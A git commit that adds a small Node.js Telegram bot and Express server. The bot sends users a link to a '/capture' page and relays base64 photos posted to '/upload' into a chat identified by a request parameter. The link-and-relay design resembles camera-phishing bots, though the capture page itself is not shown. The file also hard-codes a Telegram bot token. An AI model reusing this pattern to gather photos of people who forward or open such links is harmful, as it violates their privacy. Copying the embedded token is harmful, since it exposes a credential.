28734d688a3d9fd6dba11993e18d84620b794e2c
BLACK SHADOW <pubuduchinthaka558@gmail.com>
2025-10-17 06:23:26 +0530

    Add files via upload

---
+++ index.js
@@ -0,0 +1,30 @@
+const TelegramBot = require('node-telegram-bot-api');
+const express = require('express');
+const path = require('path');
+
+const token = '8025378224:AAHUAhgqJ-adKEKCcm7JZuhD5MQYFIEknQk';
+const bot = new TelegramBot(token, { polling: true });
+const app = express();
+
+app.use(express.static('public'));
+app.use(express.json());
+
+bot.onText(/\/start/, (msg) => {
+  const chatId = msg.chat.id;
+  const link = `https://Localhost:3000/capture?chat_id=${chatId}`;
+  bot.sendMessage(chatId, `Click this link to upload your photo: ${link}`);
+});
+
+app.get('/capture', (req, res) => {
+  const chatId = req.query.chat_id;
+  res.sendFile(path.join(__dirname, 'public', 'capture.html'));
+});
+
+app.post('/upload', (req, res) => {
+  const { chatId, photoData } = req.body;
+  // send photo back to Telegram chat
+  bot.sendPhoto(chatId, Buffer.from(photoData, 'base64'));
+  res.sendStatus(200);
+});
+
+app.listen(3000, () => console.log('Server running on port 3000'));
